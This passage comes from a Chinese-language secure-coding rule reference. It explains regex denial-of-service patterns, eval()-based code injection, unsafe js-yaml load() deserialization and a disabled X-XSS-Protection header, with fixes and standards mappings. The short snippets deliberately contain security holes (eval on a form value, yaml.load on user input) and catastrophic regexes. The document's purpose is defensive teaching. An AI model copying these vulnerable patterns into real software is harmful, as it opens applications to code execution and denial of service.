<h5 id="EXPLANATION-26"><a href="#EXPLANATION-26" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>实施正则表达式评估程序及相关方法时存在漏洞，在评估包含自重复分组表达式的正则表达式时，该漏洞会导致线程挂起。此外，还可以利用任何包含相互重叠的替代子表达式的正则表达式。此缺陷可被攻击者用于执行拒绝服务 (DoS) 攻击。</p>
<p>示例：</p>
<p>  (e+)+</p>
<p>  ([a-zA-Z]+)*</p>
<p>  (e|ee)+</p>
<p>已知的正则表达式实现方式均无法避免这种漏洞。所有平台和语言都容易受到这种攻击。</p>
<h5 id="RECOMMENDATIONS-26"><a href="#RECOMMENDATIONS-26" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请不要将不可信赖的数据用作正则表达式。</p>
<h5 id="REFERENCES-26"><a href="#REFERENCES-26" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Bryan Sullivan Regular Expression Denial of Service Attacks and Defenses </p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 185, CWE ID 730 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001094 </p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1) </p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service </p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.9 </p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.6 </p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6 </p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6 </p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.6 </p>
<p>[11] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP6080 CAT II </p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP6080 CAT II </p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP6080 CAT II </p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP6080 CAT II </p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP6080 CAT II </p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP6080 CAT II </p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP6080 CAT II </p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002400 CAT II </p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002400 CAT II </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002400 CAT II </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002400 CAT II </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002400 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002400 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002400 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002400 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002400 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002400 CAT II </p>
<p>[29] Standards Mapping - Web Application Security Consortium 24 + 2 Denial of Service </p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Denial of Service (WASC-10) </p>
<h4 id="Dynamic-Code-Evaluation-Code-Injection"><a href="#Dynamic-Code-Evaluation-Code-Injection" class="headerlink" title="Dynamic Code Evaluation: Code Injection"></a>Dynamic Code Evaluation: Code Injection</h4><h5 id="ABSTRACT-27"><a href="#ABSTRACT-27" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>在运行时中解析用户控制的指令，会让攻击者有机会执行恶意代码。</p>
<h5 id="EXPLANATION-27"><a href="#EXPLANATION-27" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>许多现代编程语言都允许动态解析源代码指令。这使得程序员可以执行基于用户输入的动态指令。当程序员错误地认为由用户直接提供的指令仅会执行一些无害的操作时（如对当前的用户对象进行简单的计算或修改用户的状态），就会出现 code injection 漏洞：然而，若不经过适当的验证，用户指定的操作可能并不是程序员最初所期望的。</p>
<p>示例：在这一典型的代码注入示例中，应用程序实施的基本计算器允许用户指定要执行的命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">	userOp = form.operation.value;</span><br><span class="line"></span><br><span class="line">	calcResult = eval(userOp);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>如果operation参数的值为良性值，程序就可以正常运行。例如，当该值为 “8 + 7 * 2” 时，calcResult变量被赋予的值将为 22。然而，如果攻击者指定的语言操作既有可能是有效的，又有可能是恶意的，那么，只有在对主进程具有完全权限的情况下才能执行这些操作。如果底层语言提供了访问系统资源的途径或允许执行系统命令，这种攻击甚至会更加危险。对于 JavaScript，攻击者还可以利用这种漏洞进行 cross-site scripting 攻击。</p>
<h5 id="RECOMMENDATIONS-27"><a href="#RECOMMENDATIONS-27" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在任何时候，都应尽可能地避免动态的代码解析。如果程序的功能要求对代码进行动态的解析，您可以通过以下方式将此种攻击的可能性降低到最小：尽可能的限制程序中动态执行的代码数量，将此类代码应用到特定的应用程序和上下文中的基本编程语言的子集。 </p>
<p>如果需要执行动态代码，应用程序绝不应当直接执行和解析未验证的用户输入。而应采用间接方法：创建一份合法操作和数据对象列表，用户可以指定其中的内容，并且只能从中进行选择。利用这种方法，就绝不会直接执行由用户提供的输入。</p>
<h5 id="REFERENCES-27"><a href="#REFERENCES-27" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 95, CWE ID 494 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [18] CWE ID 094 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001764, CCI-001774, CCI-002754 </p>
<p>[4] Standards Mapping - FIPS200 SI </p>
<p>[5] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[7] Standards Mapping - OWASP Application Security Verification Standard 4.0 1.14.2 Configuration Architectural Requirements, 5.2.4 Sanitization and Sandboxing Requirements,5.2.5 Sanitization and Sandboxing Requirements, 5.2.8 Sanitization and Sandboxing Requirements, 5.3.6 Output Encoding and Injection Prevention Requirements, 5.5.4 Deserialization Prevention Requirements, 10.3.2 Deployed Application Integrity Controls, 12.3.3 File Execution Requirements, 14.2.3 Dependency </p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection </p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws </p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws </p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A1 Injection </p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A1 Injection </p>
<p>[13] Standards Mapping - OWASP Top 10 2017 A1 Injection </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.1 </p>
<p>[21] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[22] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 116, Risky Resource Management - CWE ID 094 </p>
<p>[23] Standards Mapping - SANS Top 25 2010 Risky Resource Management - CWE ID 494 </p>
<p>[24] Standards Mapping - SANS Top 25 2011 Risky Resource Management - CWE ID 494 </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[41] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[42] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20) </p>
<h4 id="Dynamic-Code-Evaluation-Script-Injection"><a href="#Dynamic-Code-Evaluation-Script-Injection" class="headerlink" title="Dynamic Code Evaluation: Script Injection"></a>Dynamic Code Evaluation: Script Injection</h4><h5 id="ABSTRACT-28"><a href="#ABSTRACT-28" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>在运行时解析用户控制的指令，会让攻击者有机会执行恶意代码。</p>
<h5 id="EXPLANATION-28"><a href="#EXPLANATION-28" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>许多现代编程语言都允许动态解析源代码指令。这使得程序员可以执行基于用户输入的动态指令。当程序员错误地认为由用户直接提供的指令仅会执行一些无害的操作时（如对当前的用户对象进行简单的计算或修改用户的状态），就会出现 code injection 漏洞：然而，若不经过适当的验证，用户指定的操作可能并不是程序员最初所期望的。</p>
<p>示例：在这一典型的代码注入示例中，应用程序实施的基本计算器允许用户指定要执行的命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">        userOp = form.operation.value;</span><br><span class="line"></span><br><span class="line">        calcResult = eval(userOp);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>如果 operation 参数的值为良性值，程序就可以正常运行。例如，当该值为“8 + 7 * 2”时，calcResult 变量被赋予的值将为 22。然而，如果攻击者指定的语言操作既有可能是有效的，又有可能是恶意的，那么，只有在对主进程具有完全权限的情况下才能执行这些操作。如果底层语言提供了访问系统资源的途径或允许执行系统命令，这种攻击甚至会更加危险。对于 JavaScript，攻击者还可以利用这种漏洞进行 cross-site scripting 攻击。</p>
<h5 id="RECOMMENDATIONS-28"><a href="#RECOMMENDATIONS-28" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在任何时候，都应尽可能地避免动态的代码解析。如果程序的功能要求对代码进行动态的解析，您可以通过以下方式将此种攻击的可能性降低到最小：尽可能的限制程序中动态执行的代码数量，将此类代码应用到特定的应用程序和上下文中的基本编程语言的子集。</p>
<p>如果需要执行动态代码，应用程序绝不应当直接执行和解析未验证的用户输入。而应采用间接方法：创建一份合法操作和数据对象列表，用户可以指定其中的内容，并且只能从中进行选择。利用这种方法，就绝不会直接执行由用户提供的输入。</p>
<h5 id="REFERENCES-28"><a href="#REFERENCES-28" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 95, CWE ID 494 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [18] CWE ID 094 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001764, CCI-001774, CCI-002754 </p>
<p>[4] Standards Mapping - FIPS200 SI </p>
<p>[5] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[7] Standards Mapping - OWASP Application Security Verification Standard 4.0 1.14.2 Configuration Architectural Requirements, 5.2.4 Sanitization and Sandboxing Requirements, 5.2.5 Sanitization and Sandboxing Requirements, 5.2.8 Sanitization and Sandboxing Requirements, 5.3.6 Output Encoding and Injection Prevention Requirements, 10.3.2 Deployed Application Integrity Controls, 12.3.3 File Execution Requirements, 14.2.3 Dependency </p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection </p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws </p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A3 Malicious File Execution </p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A1 Injection </p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A1 Injection </p>
<p>[13] Standards Mapping - OWASP Top 10 2017 A1 Injection </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.3 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.1 </p>
<p>[21] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[22] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 116, Risky Resource Management - CWE ID 094 </p>
<p>[23] Standards Mapping - SANS Top 25 2010 Risky Resource Management - CWE ID 494 </p>
<p>[24] Standards Mapping - SANS Top 25 2011 Risky Resource Management - CWE ID 494 </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[41] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[42] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20) </p>
<h4 id="Dynamic-Code-Evaluation-Unsafe-YAML-Deserialization"><a href="#Dynamic-Code-Evaluation-Unsafe-YAML-Deserialization" class="headerlink" title="Dynamic Code Evaluation: Unsafe YAML Deserialization"></a>Dynamic Code Evaluation: Unsafe YAML Deserialization</h4><h5 id="ABSTRACT-29"><a href="#ABSTRACT-29" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>对用户控制的 YAML 流进行反序列化，可能会让攻击者有机会在服务器上执行任意代码、滥用应用程序逻辑和/或导致拒绝服务。</p>
<h5 id="EXPLANATION-29"><a href="#EXPLANATION-29" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>将对象图转换为 YAML 格式数据的 YAML 序列化库可能包括重新从 YAML 流重构对象所需的元数据。 如果攻击者可以指定要重构的对象类，并能够强制应用程序运行具有用户控制数据的任意资源库，则在 YAML 流的反序列化期间，他们也许能够执行任意代码。</p>
<p>示例 1： 以下示例使用不安全的 YAML 解析器对不受信任的 YAML 字符串进行反序列化。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var yaml = require(&apos;js-yaml&apos;);</span><br><span class="line"></span><br><span class="line">var untrusted_yaml = getYAMLFromUser();</span><br><span class="line"></span><br><span class="line">yaml.load(untrusted_yaml)</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-29"><a href="#RECOMMENDATIONS-29" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果可能，在没有验证 YAML 流的内容的情况下，请勿对不受信任的数据进行反序列化。 根据所用的 YAML 库，也许可以将反序列化过程中构造的类列入白名单。</p>
<p>JS-YAML 提供 safeLoad() 方法加载 YAML 文档，同时不允许用户实例化任意类型。 </p>
<p>示例 2： 以下示例使用安全的 YAML 解析器对不受信任的 YAML 字符串进行反序列化。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var yaml = require(&apos;js-yaml&apos;);</span><br><span class="line"></span><br><span class="line">var untrusted_yaml = getYAMLFromUser();</span><br><span class="line"></span><br><span class="line">yaml.safeLoad(untrusted_yaml)</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-29"><a href="#REFERENCES-29" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 502 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [23] CWE ID 502 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001764, CCI-001774, CCI-002754 </p>
<p>[4] Standards Mapping - FIPS200 SI </p>
<p>[5] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[7] Standards Mapping - OWASP Application Security Verification Standard 4.0 1.5.2 Input and Output Architectural Requirements, 5.5.1 Deserialization Prevention Requirements, 5.5.3 Deserialization Prevention Requirements </p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection </p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws </p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws </p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A1 Injection </p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A1 Injection </p>
<p>[13] Standards Mapping - OWASP Top 10 2017 A8 Insecure Deserialization </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.1 </p>
<p>[21] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[22] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 116 </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-001480 CAT II, APSC-DV-001490 CAT II, APSC-DV-002560 CAT I </p>
<p>[40] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20) </p>
<h4 id="HTML5-Cross-Site-Scripting-Protection"><a href="#HTML5-Cross-Site-Scripting-Protection" class="headerlink" title="HTML5: Cross-Site Scripting Protection"></a>HTML5: Cross-Site Scripting Protection</h4><h5 id="ABSTRACT-30"><a href="#ABSTRACT-30" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>明确禁用了可能提高 cross-site scripting 攻击风险的 X-XSS-Protection 标头。</p>
<h5 id="EXPLANATION-30"><a href="#EXPLANATION-30" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>X-XSS-Protection 是指在 Internet Explorer 8 和更高版本以及 Chrome 的最新版本中自动启用的标头。在标头值设置为 false (0) 时，禁用跨站点脚本保护功能。</p>
<p>可以在多个位置设置标头，并且应检查其中是否存在配置错误和恶意篡改问题。</p>
<h5 id="RECOMMENDATIONS-30"><a href="#RECOMMENDATIONS-30" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>可通过发送值为“1; mode=block”的 X-XSS-Protection 标头，将 Express 应用程序自动配置为指示浏览器支持其跨站点脚本保护。为此，Helmet 中间件可用于为新浏览器自动执行此操作。请注意，应将设置 setOnOldIE 保留为 false 的默认值，以防止在旧版 Internet Explorer 中产生漏洞。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var express = require(&apos;express&apos;);</span><br><span class="line"></span><br><span class="line">var app = express();</span><br><span class="line"></span><br><span class="line">var helmet = require(&apos;helmet&apos;);</span><br><span class="line"></span><br><span class="line">app.use(helmet());</span><br><span class="line"></span><br><span class="line">//or</span><br><span class="line"></span><br><span class="line">app.use(helmet.xssFilter());</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-30"><a href="#REFERENCES-30" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Eduardo Vela Nava, David Lindsay Abusing Internet Explorer 8’s XSS Filters </p>
<p>[2] IE8 Security Part IV: The XSS Filter </p>
<p>[3] OWASP: List of useful HTTP headers </p>
<p>[4] Node.js Security Checklist </p>
<p>[5] Standards Mapping - Common Weakness Enumeration CWE ID 554, CWE ID 1173 </p>
<p>[6] Standards Mapping - Common Weakness Enumeration Top 25 2019 [3] CWE ID 020 </p>
<p>[7] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002754 </p>
<p>[8] Standards Mapping - FIPS200 CM </p>
<p>[9] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[10] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[11] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.1.3 Input Validation Requirements, 5.1.4 Input Validation Requirements, 14.1.3 Build </p>
<p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls </p>
<p>[13] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management </p>
<p>[14] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration </p>
<p>[15] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration </p>
<p>[16] Standards Mapping - OWASP Top 10 2017 A6 Security Misconfiguration </p>
